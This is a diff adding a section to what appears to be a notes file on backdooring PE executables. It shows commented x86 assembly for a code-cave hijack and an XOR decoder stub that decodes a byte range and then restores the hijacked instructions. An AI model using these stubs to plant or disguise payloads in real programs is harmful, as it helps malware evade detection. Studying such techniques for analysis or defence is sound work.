@@ -58,3 +58,15 @@ POPAD                  # Restore the original flag values
 CALL dddd32.0041B7DE   # The first instruction we overwrote (hijack) 
 JMP 00411363           # Jump to the command that was to be executed next
 ```
+# XOR Stub Syntax
+```
+0040A770   MOV EAX, 004050ca         # Save start of encoding address in EAX 
+0040A775   XOR BYTE PTR DS:[EAX],dF  # XOR the contents of EAX with XOR key dF 
+0040A778   INC EAX                   # Increase EAX 
+0040A779   CMP EAX, 0040A76F         # Have we reached the end enc. address? 
+0040A77E   JLE SHORT 0040A775        # If not, jump back to XOR command 
+0040A780   PUSH EBP                  # If you have, restore 1st hijacked command 
+0040A781   MOV EBP,ESP               # Restore 2nd hijacked command 
+0040A783   PUSH -1                   # Restore other instructions if needed 
+0040A785   JMP 00404C05              # Jump to where we left off from. 
+```
